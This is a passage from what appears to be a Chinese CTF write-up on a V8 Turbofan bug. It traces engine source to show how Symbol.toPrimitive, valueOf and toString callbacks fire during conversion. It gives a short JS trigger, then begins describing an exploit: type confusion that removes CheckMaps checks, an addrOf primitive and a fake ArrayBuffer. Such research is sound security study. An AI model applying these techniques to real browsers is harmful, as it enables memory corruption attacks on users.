<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\builtins\builtins-conversion-gen.cc</span></span><br><span class="line">TF_BUILTIN(NonNumberToNumeric, CodeStubAssembler) &#123;</span><br><span class="line">  Node* context = Parameter(Descriptor::kContext);</span><br><span class="line">  Node* input = Parameter(Descriptor::kArgument);</span><br><span class="line"></span><br><span class="line">  Return(NonNumberToNumeric(context, input));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// src\code-stub-assembler.cc</span></span><br><span class="line">TNode&lt;Numeric&gt; CodeStubAssembler::NonNumberToNumeric(</span><br><span class="line">    SloppyTNode&lt;Context&gt; context, SloppyTNode&lt;HeapObject&gt; input) &#123;</span><br><span class="line">  Node* result = NonNumberToNumberOrNumeric(context, input,</span><br><span class="line">                                            Object::Conversion::kToNumeric);</span><br><span class="line">  CSA_SLOW_ASSERT(<span class="keyword">this</span>, IsNumeric(result));</span><br><span class="line">  <span class="keyword">return</span> UncheckedCast&lt;Numeric&gt;(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>NonNumberToNumberOrNumeric</code>函数的主要逻辑也是一个大循环，在循环里面对input的<code>instance_type</code>进行判断，判断是否是String、BigInt、ODDBALL_TYPE、JSReceiver等，然后跳转到相应的分支处去执行。如果是String，就调用<code>StringToNumber</code>把字符串转换为Number。我们要关注的是<code>if_inputisreceiver</code>这个分支，该分支会调用<code>NonPrimitiveToPrimitive</code>来把input转换为更原始的数据，如果转换结果是一个<code>Number/Numeric</code>，说明转换完成退出循环，否则继续循环。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\code-stub-assembler.cc</span></span><br><span class="line">Node* CodeStubAssembler::NonNumberToNumberOrNumeric(</span><br><span class="line">    Node* context, Node* input, Object::Conversion mode,</span><br><span class="line">    BigIntHandling bigint_handling) &#123;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">  <span class="comment">// We might need to loop once here due to ToPrimitive conversions.</span></span><br><span class="line">  VARIABLE(var_input, MachineRepresentation::kTagged, input);</span><br><span class="line">  VARIABLE(var_result, MachineRepresentation::kTagged);</span><br><span class="line">  <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &amp;var_input)</span></span>;</span><br><span class="line">  <span class="function">Label <span class="title">end</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">  Goto(&amp;loop);</span><br><span class="line">  BIND(&amp;loop);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Load the current &#123;input&#125; value (known to be a HeapObject).</span></span><br><span class="line">    Node* input = var_input.value();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取input的instancetype</span></span><br><span class="line">    <span class="comment">// Dispatch on the &#123;input&#125; instance type.</span></span><br><span class="line">    Node* input_instance_type = LoadInstanceType(input);</span><br><span class="line">	<span class="comment">// 定义多个标签，每个标签对应一个跳转分支</span></span><br><span class="line">    Label if_inputisstring(this), if_inputisoddball(this),</span><br><span class="line">        if_inputisbigint(<span class="keyword">this</span>), if_inputisreceiver(<span class="keyword">this</span>, Label::kDeferred),</span><br><span class="line">        if_inputisother(<span class="keyword">this</span>, Label::kDeferred);</span><br><span class="line">	<span class="comment">// 依次判断instance_type是不是String、BigInt、ODDBALL_TYPE、JSReceiver等，并跳转到相应的分支继续执行</span></span><br><span class="line">    GotoIf(IsStringInstanceType(input_instance_type), &amp;if_inputisstring);</span><br><span class="line">    GotoIf(IsBigIntInstanceType(input_instance_type), &amp;if_inputisbigint);</span><br><span class="line">    GotoIf(InstanceTypeEqual(input_instance_type, ODDBALL_TYPE),</span><br><span class="line">           &amp;if_inputisoddball);</span><br><span class="line">    Branch(IsJSReceiverInstanceType(input_instance_type), &amp;if_inputisreceiver,</span><br><span class="line">           &amp;if_inputisother);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果是字符串</span></span><br><span class="line">    BIND(&amp;if_inputisstring);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// The &#123;input&#125; is a String, use the fast stub to convert it to a Number.</span></span><br><span class="line">      TNode&lt;String&gt; string_input = CAST(input);</span><br><span class="line">      var_result.Bind(StringToNumber(string_input));</span><br><span class="line">      Goto(&amp;end);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 如果是BigInt</span></span><br><span class="line">    BIND(&amp;if_inputisbigint);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 是ODDBALL_TYPE</span></span><br><span class="line">    BIND(&amp;if_inputisoddball);</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 是JSReceiver</span></span><br><span class="line">    BIND(&amp;if_inputisreceiver);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// The &#123;input&#125; is a JSReceiver, we need to convert it to a Primitive first</span></span><br><span class="line">      <span class="comment">// using the ToPrimitive type conversion, preferably yielding a Number.</span></span><br><span class="line">	  <span class="comment">// 调用NonPrimitiveToPrimitive来把input转换为更原始的数据</span></span><br><span class="line">      Callable callable = CodeFactory::NonPrimitiveToPrimitive(</span><br><span class="line">          isolate(), ToPrimitiveHint::kNumber);</span><br><span class="line">      Node* result = CallStub(callable, context, input);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Check if the &#123;result&#125; is already a Number/Numeric.</span></span><br><span class="line">	  <span class="comment">//检查结果是Number还是Numeric</span></span><br><span class="line">      Label if_done(this), if_notdone(this);</span><br><span class="line">      Branch(mode == Object::Conversion::kToNumber ? IsNumber(result)</span><br><span class="line">                                                   : IsNumeric(result),</span><br><span class="line">             &amp;if_done, &amp;if_notdone);</span><br><span class="line"></span><br><span class="line">      BIND(&amp;if_done);</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// The ToPrimitive conversion already gave us a Number/Numeric, so we're</span></span><br><span class="line">        <span class="comment">// done.</span></span><br><span class="line">		<span class="comment">// 通过ToPrimitive的转换，已经得到了一个Number/Numeric，退出循环</span></span><br><span class="line">        var_result.Bind(result);</span><br><span class="line">        Goto(&amp;end);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      BIND(&amp;if_notdone);</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// We now have a Primitive &#123;result&#125;, but it's not yet a Number/Numeric.</span></span><br><span class="line">		<span class="comment">// 得到了更原始的结果，但是仍然不是Number/Numeric，继续循环。</span></span><br><span class="line">        var_input.Bind(result);</span><br><span class="line">        Goto(&amp;loop);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// other</span></span><br><span class="line">    BIND(&amp;if_inputisother);</span><br><span class="line">    &#123;</span><br><span class="line">	  ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> var_result.value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>NonPrimitiveToPrimitive</code>内部调用了<code>Builtins</code>函数<code>NonPrimitiveToPrimitive</code>，依据hint的类型调用相应的处理函数。这里的hint是<code>kNumber</code>，因此调用的是<code>NonPrimitiveToPrimitive_Number</code>函数，函数内部也仅仅是调用<code>Generate_NonPrimitiveToPrimitive</code>来进一步对参数进行处理。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\code-factory.cc</span></span><br><span class="line">Callable CodeFactory::NonPrimitiveToPrimitive(Isolate* isolate,</span><br><span class="line">                                              ToPrimitiveHint hint) &#123;</span><br><span class="line">  <span class="keyword">return</span> Callable(isolate-&gt;builtins()-&gt;NonPrimitiveToPrimitive(hint),</span><br><span class="line">                  TypeConversionDescriptor&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// src\builtins\builtins.cc</span></span><br><span class="line">Handle&lt;Code&gt; Builtins::NonPrimitiveToPrimitive(ToPrimitiveHint hint) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (hint) &#123;</span><br><span class="line">    <span class="keyword">case</span> ToPrimitiveHint::kDefault:</span><br><span class="line">      <span class="keyword">return</span> builtin_handle(kNonPrimitiveToPrimitive_Default);</span><br><span class="line">    <span class="keyword">case</span> ToPrimitiveHint::kNumber:</span><br><span class="line">      <span class="keyword">return</span> builtin_handle(kNonPrimitiveToPrimitive_Number); <span class="comment">// here</span></span><br><span class="line">    <span class="keyword">case</span> ToPrimitiveHint::kString:</span><br><span class="line">      <span class="keyword">return</span> builtin_handle(kNonPrimitiveToPrimitive_String);</span><br><span class="line">  &#125;</span><br><span class="line">  UNREACHABLE();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// src\builtins\builtins-conversion-gen.cc</span></span><br><span class="line">TF_BUILTIN(NonPrimitiveToPrimitive_Number, ConversionBuiltinsAssembler) &#123;</span><br><span class="line">  Node* context = Parameter(Descriptor::kContext);</span><br><span class="line">  Node* input = Parameter(Descriptor::kArgument);</span><br><span class="line"></span><br><span class="line">  Generate_NonPrimitiveToPrimitive(context, input, ToPrimitiveHint::kNumber);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Generate_NonPrimitiveToPrimitive</code>函数内部会查找input的<code>@@toPrimitive</code>属性，如果存在相关属性便会通过<code>CallJS</code>来调用我们的<code>@@toPrimitive</code>属性<code>exotic_to_prim</code>，那这个toPrimitive到底是个什么呢？查了一下发现这个属性是我们可以定义的，也就是说这个地方是我们可以设置的回调函数！！！</p>
<pre><code>Symbol.toPrimitive 是一个内置的 Symbol 值，它是作为对象的函数值属性存在的，当一个对象转换为对应的原始值时，会调用此函数。
</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\builtins\builtins-conversion-gen.cc</span></span><br><span class="line"><span class="comment">// ES6 section 7.1.1 ToPrimitive ( input [ , PreferredType ] )</span></span><br><span class="line"><span class="keyword">void</span> ConversionBuiltinsAssembler::Generate_NonPrimitiveToPrimitive(</span><br><span class="line">    Node* context, Node* input, ToPrimitiveHint hint) &#123;</span><br><span class="line">  <span class="comment">// Lookup the @@toPrimitive property on the &#123;input&#125;.</span></span><br><span class="line">  Node* exotic_to_prim =</span><br><span class="line">      GetProperty(context, input, factory()-&gt;to_primitive_symbol());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if &#123;exotic_to_prim&#125; is neither null nor undefined.</span></span><br><span class="line">  <span class="comment">// 检查exotic_to_prim，若既不是null也不是undefined</span></span><br><span class="line">  <span class="function">Label <span class="title">ordinary_to_primitive</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">  GotoIf(IsNullOrUndefined(exotic_to_prim), &amp;ordinary_to_primitive);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Invoke the &#123;exotic_to_prim&#125; method on the &#123;input&#125; with a string</span></span><br><span class="line">    <span class="comment">// representation of the &#123;hint&#125;.</span></span><br><span class="line">    Callable callable =</span><br><span class="line">        CodeFactory::Call(isolate(), ConvertReceiverMode::kNotNullOrUndefined);</span><br><span class="line">    Node* hint_string = HeapConstant(factory()-&gt;ToPrimitiveHintString(hint));</span><br><span class="line">	<span class="comment">// calljs调用exotic_to_prim</span></span><br><span class="line">    Node* result =</span><br><span class="line">        CallJS(callable, context, exotic_to_prim, input, hint_string);</span><br><span class="line">	<span class="comment">//判断结果是否是一个原始值</span></span><br><span class="line">    <span class="comment">// Verify that the &#123;result&#125; is actually a primitive.</span></span><br><span class="line">    Label if_resultisprimitive(this),</span><br><span class="line">        if_resultisnotprimitive(<span class="keyword">this</span>, Label::kDeferred);</span><br><span class="line">    GotoIf(TaggedIsSmi(result), &amp;if_resultisprimitive);</span><br><span class="line">    Node* result_instance_type = LoadInstanceType(result);</span><br><span class="line">    Branch(IsPrimitiveInstanceType(result_instance_type), &amp;if_resultisprimitive,</span><br><span class="line">           &amp;if_resultisnotprimitive);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;if_resultisprimitive);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Just return the &#123;result&#125;.</span></span><br><span class="line">      Return(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;if_resultisnotprimitive);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Somehow the @@toPrimitive method on &#123;input&#125; didn't yield a primitive.</span></span><br><span class="line">      ThrowTypeError(context, MessageTemplate::kCannotConvertToPrimitive);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Convert using the OrdinaryToPrimitive algorithm instead.</span></span><br><span class="line">  BIND(&amp;ordinary_to_primitive);</span><br><span class="line">  &#123;</span><br><span class="line">    Callable callable = CodeFactory::OrdinaryToPrimitive(</span><br><span class="line">        isolate(), (hint == ToPrimitiveHint::kString)</span><br><span class="line">                       ? OrdinaryToPrimitiveHint::kString</span><br><span class="line">                       : OrdinaryToPrimitiveHint::kNumber);</span><br><span class="line">    TailCallStub(callable, context, input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以按照上面的分析，我们可以设置对象的<code>toPrimitive</code>属性，然后在处理过程中会调用该属性对应的回调函数，如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">	[<span class="built_in">Symbol</span>.toPrimitive](hint) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">112233</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b1 = &#123;</span><br><span class="line">	[<span class="built_in">Symbol</span>.toPrimitive](hint) &#123;</span><br><span class="line">		print(<span class="string">'callback'</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">112233</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">opt_me(<span class="number">1234</span>,b);</span><br><span class="line">opt_me(<span class="number">1234</span>,b);</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me(<span class="number">2345</span>,b1);</span><br><span class="line"><span class="comment">// output： callback</span></span><br></pre></td></tr></table></figure>
<h3 id="探寻回调函数-valueOf"><a href="#探寻回调函数-valueOf" class="headerlink" title="探寻回调函数-valueOf"></a>探寻回调函数-valueOf</h3><p>通过前面的分析我们找到了一处回调函数调用的地方<code>toPrimitive</code>属性，这已经可以用来进行漏洞利用了，但是还是没有找到最开始发现的<code>valueOf</code>回调函数调用的地方，所以还要继续分析！</p>
<p>我们开始定义的包含<code>valueOf</code>的对象没有定义相应的<code>toPrimitive</code>属性，所以在<code>Generate_NonPrimitiveToPrimitive</code>中它应该会跳转到<code>ordinary_to_primitive</code>分支处执行，也就是会调用<code>OrdinaryToPrimitive</code>函数。这个函数的逻辑和前面分析的很相似，最后会跳转到<code>Generate_OrdinaryToPrimitive</code>函数中执行。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\code-factory.cc</span></span><br><span class="line"><span class="comment">// static</span></span><br><span class="line">Callable CodeFactory::OrdinaryToPrimitive(Isolate* isolate,</span><br><span class="line">                                          OrdinaryToPrimitiveHint hint) &#123;</span><br><span class="line">  <span class="keyword">return</span> Callable(isolate-&gt;builtins()-&gt;OrdinaryToPrimitive(hint),</span><br><span class="line">                  TypeConversionDescriptor&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// src\builtins\builtins.cc</span></span><br><span class="line">Handle&lt;Code&gt; Builtins::OrdinaryToPrimitive(OrdinaryToPrimitiveHint hint) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (hint) &#123;</span><br><span class="line">    <span class="keyword">case</span> OrdinaryToPrimitiveHint::kNumber:</span><br><span class="line">      <span class="keyword">return</span> builtin_handle(kOrdinaryToPrimitive_Number);</span><br><span class="line">    <span class="keyword">case</span> OrdinaryToPrimitiveHint::kString:</span><br><span class="line">      <span class="keyword">return</span> builtin_handle(kOrdinaryToPrimitive_String);</span><br><span class="line">  &#125;</span><br><span class="line">  UNREACHABLE();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// src\builtins\builtins-conversion-gen.cc</span></span><br><span class="line">TF_BUILTIN(OrdinaryToPrimitive_Number, ConversionBuiltinsAssembler) &#123;</span><br><span class="line">  Node* context = Parameter(Descriptor::kContext);</span><br><span class="line">  Node* input = Parameter(Descriptor::kArgument);</span><br><span class="line">  Generate_OrdinaryToPrimitive(context, input,</span><br><span class="line">                               OrdinaryToPrimitiveHint::kNumber);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Generate_OrdinaryToPrimitive</code>函数中终于出现了我们所期望的内容，该函数依据hint的值来设置<code>method_names</code>变量中的内容，主要是<code>valueOf</code>和<code>toString</code>。然后会尝试从input中获取<code>valueOf/toString</code>属性，如果获取到的属性是<code>callable</code>，那么就调用它，所以我们定义的valueOf属性对应的回调函数会被调用，至此源码分析结束！</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\builtins\builtins-conversion-gen.cc</span></span><br><span class="line"><span class="comment">// 7.1.1.1 OrdinaryToPrimitive ( O, hint )</span></span><br><span class="line"><span class="keyword">void</span> ConversionBuiltinsAssembler::Generate_OrdinaryToPrimitive(</span><br><span class="line">    Node* context, Node* input, OrdinaryToPrimitiveHint hint) &#123;</span><br><span class="line">  VARIABLE(var_result, MachineRepresentation::kTagged);</span><br><span class="line">  <span class="function">Label <span class="title">return_result</span><span class="params">(<span class="keyword">this</span>, &amp;var_result)</span></span>;</span><br><span class="line">  <span class="comment">// 依据hint来设置method_names</span></span><br><span class="line">  Handle&lt;String&gt; method_names[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">switch</span> (hint) &#123;</span><br><span class="line">    <span class="keyword">case</span> OrdinaryToPrimitiveHint::kNumber:</span><br><span class="line">      method_names[<span class="number">0</span>] = factory()-&gt;valueOf_string();</span><br><span class="line">      method_names[<span class="number">1</span>] = factory()-&gt;toString_string();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OrdinaryToPrimitiveHint::kString:</span><br><span class="line">      method_names[<span class="number">0</span>] = factory()-&gt;toString_string();</span><br><span class="line">      method_names[<span class="number">1</span>] = factory()-&gt;valueOf_string();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 遍历method_names，依据method_name来获取input中对应的属性</span></span><br><span class="line">  <span class="keyword">for</span> (Handle&lt;String&gt; name : method_names) &#123;</span><br><span class="line">    <span class="comment">// Lookup the &#123;name&#125; on the &#123;input&#125;.</span></span><br><span class="line">    Node* method = GetProperty(context, input, name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if the &#123;method&#125; is callable.</span></span><br><span class="line">	<span class="comment">// 检查获取到的method是否是callable</span></span><br><span class="line">    Label if_methodiscallable(this),</span><br><span class="line">        if_methodisnotcallable(<span class="keyword">this</span>, Label::kDeferred);</span><br><span class="line">    GotoIf(TaggedIsSmi(method), &amp;if_methodisnotcallable);</span><br><span class="line">    Node* method_map = LoadMap(method);</span><br><span class="line">    Branch(IsCallableMap(method_map), &amp;if_methodiscallable,</span><br><span class="line">           &amp;if_methodisnotcallable);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过CallJS来调用我们的回调函数</span></span><br><span class="line">    BIND(&amp;if_methodiscallable);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Call the &#123;method&#125; on the &#123;input&#125;.</span></span><br><span class="line">      Callable callable = CodeFactory::Call(</span><br><span class="line">          isolate(), ConvertReceiverMode::kNotNullOrUndefined);</span><br><span class="line">      Node* result = CallJS(callable, context, method, input);</span><br><span class="line">      var_result.Bind(result);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Return the &#123;result&#125; if it is a primitive.</span></span><br><span class="line">      GotoIf(TaggedIsSmi(result), &amp;return_result);</span><br><span class="line">      Node* result_instance_type = LoadInstanceType(result);</span><br><span class="line">      GotoIf(IsPrimitiveInstanceType(result_instance_type), &amp;return_result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Just continue with the next &#123;name&#125; if the &#123;method&#125; is not callable.</span></span><br><span class="line">    Goto(&amp;if_methodisnotcallable);</span><br><span class="line">    BIND(&amp;if_methodisnotcallable);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ThrowTypeError(context, MessageTemplate::kCannotConvertToPrimitive);</span><br><span class="line"></span><br><span class="line">  BIND(&amp;return_result);</span><br><span class="line">  Return(var_result.value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本节以patch文件为切入点，从源码的角度分析了漏洞存在的地方，结合<code>数字经济线下赛</code>的解题思路找到了触发漏洞的方式，然后以此探寻了回调函数最终被调用的根源，最终找到了三种定义回调函数的方法：</p>
<ul>
<li>Symbol.toPrimitive属性</li>
<li>valueOf属性</li>
<li>toString属性</li>
</ul>
<h2 id="漏洞利用-Fake-ArrayBuffer"><a href="#漏洞利用-Fake-ArrayBuffer" class="headerlink" title="漏洞利用 - Fake ArrayBuffer"></a>漏洞利用 - Fake ArrayBuffer</h2><p>该利用方法是从<code>Sakura</code>师傅写的<a href="http://eternalsakura13.com/2019/04/29/v9/" target="_blank" rel="noopener">34c3 v9 writeup</a>中学到的。最初我构造出addrOf和fakeObj之后被卡了很久，主要就是拿不到一个合法的map，从师傅的文章里面了解到伪造<code>ArrayBuffer map</code>并进一步伪造出<code>ArrayBuffer</code>是可行的。</p>
<h3 id="addrOf原语"><a href="#addrOf原语" class="headerlink" title="addrOf原语"></a>addrOf原语</h3><p>利用Turbofan对<code>BitwiseAnd</code>节点影响的误判，我们可以消除掉对象属性访问的<code>CheckMaps</code>节点，进而造成类型混淆。例如定义<code>let c = {x:1.2,y:1.3};</code>，在两次属性访问<code>c.x</code>和<code>c.y</code>之间插入<code>a&amp;b</code>操作，c.y的<code>ChekMaps</code>节点仍会被消除，如果在回调函数中把<code>c.y</code>赋值为一个对象，那么<code>return c.y;</code>仍然会按照之前的类型<code>double</code>来返回数据，实现对象的地址信息泄露。由于正常写addrOf原语每调用一次之后就得重新写一个新的addrOf函数，因此我在<code>addrOf</code>中加入了部分动态生成的代码片段，如下所示：</p>
